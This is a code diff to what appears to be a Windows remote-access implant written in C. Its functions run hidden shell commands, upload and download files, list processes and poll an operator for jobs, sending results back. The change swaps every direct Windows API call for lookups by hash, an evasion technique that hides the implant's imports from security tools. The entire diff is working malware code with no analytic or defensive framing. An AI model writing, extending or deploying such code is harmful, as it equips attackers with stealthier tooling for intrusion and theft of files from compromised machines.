@@ -1,5 +1,7 @@
 #include "Command.h"
 #include "Package.h"
+#include "Resolve.h"
+#include "Hashes.h"
 #include <stdio.h>
 #include <tlhelp32.h>
 
@@ -66,6 +68,30 @@ UINT32 DetectEndianness(PVOID Buffer, UINT32 Size){
 
 
 VOID CommandShell(PTASK_PARSER Parser){
+    typedef BOOL (WINAPI* fn_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
+    typedef BOOL (WINAPI* fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+    typedef BOOL (WINAPI* fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+    typedef BOOL (WINAPI* fn_Close)(HANDLE);
+    typedef DWORD (WINAPI* fn_Wait)(HANDLE, DWORD);
+    typedef HLOCAL (WINAPI* fn_Alloc)(UINT, SIZE_T);
+    typedef HLOCAL (WINAPI* fn_ReAlloc)(HLOCAL, SIZE_T, UINT);
+    typedef HLOCAL (WINAPI* fn_Free)(HLOCAL);
+
+    HMODULE k32 = ResolveModuleH(H_KERNEL32);
+    if (!k32) return;
+
+    fn_CreatePipe     pPipe    = (fn_CreatePipe)ResolveFuncH(k32, H_CreatePipe);
+    fn_CreateProcessA pExec    = (fn_CreateProcessA)ResolveFuncH(k32, H_CreateProcessA);
+    fn_ReadFile       pRead    = (fn_ReadFile)ResolveFuncH(k32, H_ReadFile);
+    fn_Close          pClose   = (fn_Close)ResolveFuncH(k32, H_CloseHandle);
+    fn_Wait           pWait    = (fn_Wait)ResolveFuncH(k32, H_WaitForSingleObject);
+    fn_Alloc          pAlloc   = (fn_Alloc)ResolveFuncH(k32, H_LocalAlloc);
+    fn_ReAlloc        pReAlloc = (fn_ReAlloc)ResolveFuncH(k32, H_LocalReAlloc);
+    fn_Free           pFree    = (fn_Free)ResolveFuncH(k32, H_LocalFree);
+
+    if (!pPipe || !pExec || !pRead || !pClose || !pWait || !pAlloc)
+        return;
+
     UINT32  dwLen           = 0;
     PCHAR   Cmd             = NULL;
     HANDLE  hStdOutRd       = NULL;
@@ -85,12 +111,12 @@ VOID CommandShell(PTASK_PARSER Parser){
     if (dwLen >= sizeof(buf) - off) dwLen = sizeof(buf) - off - 1;
     memcpy(buf + off, Cmd, dwLen);
 
-    if (!CreatePipe(&hStdInRd, &hStdInWr, &sa, 0))
+    if (!pPipe(&hStdInRd, &hStdInWr, &sa, 0))
         return;
 
-    if (!CreatePipe(&hStdOutRd, &hStdOutWr, &sa, 0)){
-        CloseHandle(hStdInRd);
-        CloseHandle(hStdInWr);
+    if (!pPipe(&hStdOutRd, &hStdOutWr, &sa, 0)){
+        pClose(hStdInRd);
+        pClose(hStdInWr);
         return;
     }
 
@@ -100,41 +126,54 @@ VOID CommandShell(PTASK_PARSER Parser){
     si.hStdOutput = hStdOutWr;
     si.hStdInput  = hStdInRd;
 
-    if (!CreateProcessA(NULL, buf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)){
-        CloseHandle(hStdInRd);  CloseHandle(hStdInWr);
-        CloseHandle(hStdOutRd); CloseHandle(hStdOutWr);
+    if (!pExec(NULL, buf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)){
+        pClose(hStdInRd);  pClose(hStdInWr);
+        pClose(hStdOutRd); pClose(hStdOutWr);
         return;
     }
 
-    CloseHandle(hStdOutWr);
-    CloseHandle(hStdInRd);
+    pClose(hStdOutWr);
+    pClose(hStdInRd);
 
-    PVOID  pOut     = LocalAlloc(LPTR, 1);
+    PVOID  pOut     = pAlloc(LPTR, 1);
     DWORD  dwOut    = 0;
     UCHAR  tmp[1024];
     DWORD  dwRead   = 0;
 
-    while (ReadFile(hStdOutRd, tmp, sizeof(tmp) - 1, &dwRead, NULL) && dwRead > 0){
-        pOut = LocalReAlloc(pOut, dwOut + dwRead, LMEM_MOVEABLE | LMEM_ZEROINIT);
+    while (pRead(hStdOutRd, tmp, sizeof(tmp) - 1, &dwRead, NULL) && dwRead > 0){
+        pOut = pReAlloc(pOut, dwOut + dwRead, LMEM_MOVEABLE | LMEM_ZEROINIT);
         memcpy((PUCHAR)pOut + dwOut, tmp, dwRead);
         dwOut += dwRead;
     }
 
-    WaitForSingleObject(pi.hProcess, INFINITE);
+    pWait(pi.hProcess, INFINITE);
 
     PPACKAGE Pkg = PackageCreate(COMMAND_OUTPUT);
     PackageAddBytes(Pkg, (PUCHAR)pOut, dwOut);
     PackageTransmit(Pkg, NULL, NULL);
 
-    LocalFree(pOut);
-    CloseHandle(hStdOutRd);
-    CloseHandle(hStdInWr);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+    pFree(pOut);
+    pClose(hStdOutRd);
+    pClose(hStdInWr);
+    pClose(pi.hProcess);
+    pClose(pi.hThread);
 }
 
 
 VOID CommandUpload(PTASK_PARSER Parser){
+    typedef HANDLE (WINAPI* fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+    typedef BOOL (WINAPI* fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
+    typedef BOOL (WINAPI* fn_Close)(HANDLE);
+
+    HMODULE k32 = ResolveModuleH(H_KERNEL32);
+    if (!k32) return;
+
+    fn_CreateFileA pCreateFile = (fn_CreateFileA)ResolveFuncH(k32, H_CreateFileA);
+    fn_WriteFile   pWrite      = (fn_WriteFile)ResolveFuncH(k32, H_WriteFile);
+    fn_Close       pClose      = (fn_Close)ResolveFuncH(k32, H_CloseHandle);
+
+    if (!pCreateFile || !pWrite || !pClose) return;
+
     UINT32  nameLen  = 0;
     UINT32  fileSize = 0;
     PCHAR   fileName = TaskParserGetBytes(Parser, &nameLen);
@@ -147,12 +186,12 @@ VOID CommandUpload(PTASK_PARSER Parser){
     if (nameLen >= sizeof(nameBuf)) nameLen = sizeof(nameBuf) - 1;
     memcpy(nameBuf, fileName, nameLen);
 
-    HANDLE hFile = CreateFileA(nameBuf, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hFile = pCreateFile(nameBuf, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE)
         return;
 
-    WriteFile(hFile, content, fileSize, &written, NULL);
-    CloseHandle(hFile);
+    pWrite(hFile, content, fileSize, &written, NULL);
+    pClose(hFile);
 
     PPACKAGE Pkg = PackageCreate(COMMAND_OUTPUT);
     char msg[512];
@@ -162,6 +201,25 @@ VOID CommandUpload(PTASK_PARSER Parser){
 }
 
 VOID CommandDownload(PTASK_PARSER Parser){
+    typedef HANDLE (WINAPI* fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+    typedef BOOL (WINAPI* fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+    typedef DWORD (WINAPI* fn_GetFileSize)(HANDLE, LPDWORD);
+    typedef BOOL (WINAPI* fn_Close)(HANDLE);
+    typedef HLOCAL (WINAPI* fn_Alloc)(UINT, SIZE_T);
+    typedef HLOCAL (WINAPI* fn_Free)(HLOCAL);
+
+    HMODULE k32 = ResolveModuleH(H_KERNEL32);
+    if (!k32) return;
+
+    fn_CreateFileA pOpen  = (fn_CreateFileA)ResolveFuncH(k32, H_CreateFileA);
+    fn_ReadFile    pRead  = (fn_ReadFile)ResolveFuncH(k32, H_ReadFile);
+    fn_GetFileSize pSize  = (fn_GetFileSize)ResolveFuncH(k32, H_GetFileSize);
+    fn_Close       pClose = (fn_Close)ResolveFuncH(k32, H_CloseHandle);
+    fn_Alloc       pAlloc = (fn_Alloc)ResolveFuncH(k32, H_LocalAlloc);
+    fn_Free        pFree  = (fn_Free)ResolveFuncH(k32, H_LocalFree);
+
+    if (!pOpen || !pRead || !pSize || !pClose || !pAlloc) return;
+
     UINT32 nameLen  = 0;
     PCHAR  fileName = TaskParserGetBytes(Parser, &nameLen);
 
@@ -171,70 +229,97 @@ VOID CommandDownload(PTASK_PARSER Parser){
     if (nameLen >= sizeof(nameBuf)) nameLen = sizeof(nameBuf) - 1;
     memcpy(nameBuf, fileName, nameLen);
 
-    HANDLE hFile = CreateFileA(nameBuf, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE hFile = pOpen(nameBuf, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE)
         return;
 
-    DWORD fileSize = GetFileSize(hFile, NULL);
-    PVOID fileBuf  = LocalAlloc(LPTR, fileSize);
-    DWORD dwRead   = 0;
+    DWORD fSize  = pSize(hFile, NULL);
+    PVOID fileBuf = pAlloc(LPTR, fSize);
+    DWORD dwRead  = 0;
 
-    if (!ReadFile(hFile, fileBuf, fileSize, &dwRead, NULL)){
-        CloseHandle(hFile);
-        LocalFree(fileBuf);
+    if (!pRead(hFile, fileBuf, fSize, &dwRead, NULL)){
+        pClose(hFile);
+        pFree(fileBuf);
         return;
     }
-    CloseHandle(hFile);
+    pClose(hFile);
 
     PPACKAGE Pkg = PackageCreate(COMMAND_DOWNLOAD);
     PackageAddBytes(Pkg, (PUCHAR)nameBuf, strlen(nameBuf));
     PackageAddBytes(Pkg, fileBuf, dwRead);
     PackageTransmit(Pkg, NULL, NULL);
 
-    LocalFree(fileBuf);
+    pFree(fileBuf);
 }
 
 VOID CommandProcList(PTASK_PARSER Parser){
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    typedef HANDLE (WINAPI* fn_Snapshot)(DWORD, DWORD);
+    typedef BOOL (WINAPI* fn_ProcFirst)(HANDLE, LPPROCESSENTRY32);
+    typedef BOOL (WINAPI* fn_ProcNext)(HANDLE, LPPROCESSENTRY32);
+    typedef BOOL (WINAPI* fn_Close)(HANDLE);
+    typedef HLOCAL (WINAPI* fn_Alloc)(UINT, SIZE_T);
+    typedef HLOCAL (WINAPI* fn_ReAlloc)(HLOCAL, SIZE_T, UINT);
+    typedef HLOCAL (WINAPI* fn_Free)(HLOCAL);
+
+    HMODULE k32 = ResolveModuleH(H_KERNEL32);
+    if (!k32) return;
+
+    fn_Snapshot  pSnapshot   = (fn_Snapshot)ResolveFuncH(k32, H_CreateToolhelp32Snapshot);
+    fn_ProcFirst pProcFirst  = (fn_ProcFirst)ResolveFuncH(k32, H_Process32First);
+    fn_ProcNext  pProcNext   = (fn_ProcNext)ResolveFuncH(k32, H_Process32Next);
+    fn_Close     pCloseH     = (fn_Close)ResolveFuncH(k32, H_CloseHandle);
+    fn_Alloc     pAlloc      = (fn_Alloc)ResolveFuncH(k32, H_LocalAlloc);
+    fn_ReAlloc   pReAlloc    = (fn_ReAlloc)ResolveFuncH(k32, H_LocalReAlloc);
+    fn_Free      pFreeM      = (fn_Free)ResolveFuncH(k32, H_LocalFree);
+
+    if (!pSnapshot || !pProcFirst || !pProcNext || !pCloseH || !pAlloc)
+        return;
+
+    HANDLE hSnap = pSnapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap == INVALID_HANDLE_VALUE)
         return;
 
-    PROCESSENTRY32 entry;
-    entry.dwSize = sizeof(entry);
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(pe);
 
-    DWORD bufSz  = 0x10000;
-    PCHAR result  = (PCHAR)LocalAlloc(LPTR, bufSz);
-    if (!result){ CloseHandle(hSnap); return; }
+    DWORD cap = 0x10000;
+    PCHAR out = (PCHAR)pAlloc(LPTR, cap);
+    if (!out) { pCloseH(hSnap); return; }
 
-    int written = wsprintfA(result, "PID    PPID   Name\n---    ----   ----\n");
+    int pos = wsprintfA(out, "PID    PPID   Name\n---    ----   ----\n");
 
-    if (Process32First(hSnap, &entry)){
+    if (pProcFirst(hSnap, &pe)) {
         do {
-            CHAR tmp[300];
-            int len = wsprintfA(tmp, "%-6lu %-6lu %s\n", entry.th32ProcessID, entry.th32ParentProcessID, entry.szExeFile);
+            CHAR line[300];
+            int n = wsprintfA(line, "%-6lu %-6lu %s\n", pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
 
-            if ((DWORD)(written + len) >= bufSz){
-                bufSz *= 2;
-                result = (PCHAR)LocalReAlloc(result, bufSz, LMEM_MOVEABLE);
-                if (!result) break;
+            if ((DWORD)(pos + n) >= cap) {
+                cap *= 2;
+                out = (PCHAR)pReAlloc(out, cap, LMEM_MOVEABLE);
+                if (!out) break;
             }
-            memcpy(result + written, tmp, len);
-            written += len;
-        } while (Process32Next(hSnap, &entry));
+            memcpy(out + pos, line, n);
+            pos += n;
+        } while (pProcNext(hSnap, &pe));
     }
 
-    CloseHandle(hSnap);
+    pCloseH(hSnap);
 
-    if (result){
-        PPACKAGE Pkg = PackageCreate(COMMAND_OUTPUT);
-        PackageAddBytes(Pkg, (PUCHAR)result, written);
-        PackageTransmit(Pkg, NULL, NULL);
-        LocalFree(result);
+    if (out) {
+        PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
+        PackageAddBytes(pkg, (PUCHAR)out, pos);
+        PackageTransmit(pkg, NULL, NULL);
+        pFreeM(out);
     }
 }
 
 VOID CommandExit(PTASK_PARSER Parser){
-    ExitProcess(0);
+    typedef VOID (WINAPI* fn_ExitProcess)(UINT);
+    HMODULE k32 = ResolveModuleH(H_KERNEL32);
+    if (!k32) return;
+    fn_ExitProcess pExit = (fn_ExitProcess)ResolveFuncH(k32, H_ExitProcess);
+    if (pExit) pExit(0);
 }
 
 static COMMAND_ENTRY CommandTable[COMMAND_COUNT] = {
@@ -246,6 +331,16 @@ static COMMAND_ENTRY CommandTable[COMMAND_COUNT] = {
 };
 
 VOID CommandDispatcher(VOID){
+    typedef VOID (WINAPI* fn_Sleep)(DWORD);
+    typedef HLOCAL (WINAPI* fn_Free)(HLOCAL);
+
+    HMODULE k32 = ResolveModuleH(H_KERNEL32);
+    if (!k32) return;
+
+    fn_Sleep pSleep = (fn_Sleep)ResolveFuncH(k32, H_Sleep);
+    fn_Free  pFree  = (fn_Free)ResolveFuncH(k32, H_LocalFree);
+    if (!pSleep || !pFree) return;
+
     PPACKAGE    Package    = NULL;
     PVOID       Data       = NULL;
     SIZE_T      Size       = 0;
@@ -254,7 +349,7 @@ VOID CommandDispatcher(VOID){
         if (!g_Connected)
             return;
 
-        Sleep(g_SleepTime * 1000);
+        pSleep(g_SleepTime * 1000);
 
         Package = PackageCreate(COMMAND_GET_JOB);
         PackageAddInt32(Package, g_AgentID);
@@ -294,7 +389,7 @@ VOID CommandDispatcher(VOID){
 next:
         if (Data){
             memset(Data, 0, Size);
-            LocalFree(Data);
+            pFree(Data);
             Data = NULL;
         }
 
